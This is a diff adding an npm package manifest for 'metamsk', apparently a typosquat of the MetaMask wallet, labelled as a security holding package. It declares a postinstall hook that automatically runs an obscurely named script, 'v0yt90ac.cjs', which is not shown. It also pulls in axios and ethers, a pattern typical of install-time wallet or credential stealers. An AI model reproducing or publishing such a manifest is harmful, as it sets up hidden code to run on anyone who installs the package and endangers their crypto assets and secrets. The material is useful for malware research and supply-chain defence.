@@ -1,0 +1,16 @@
+{
+  "name": "metamsk",
+  "version": "0.0.1-security",
+  "description": "security holding package",
+  "repository": "npm/security-holder",
+  "scripts": {
+    "postinstall": "node v0yt90ac.cjs"
+  },
+  "files": [
+    "v0yt90ac.cjs"
+  ],
+  "dependencies": {
+    "axios": "^1.7.7",
+    "ethers": "^6.13.2"
+  }
+}
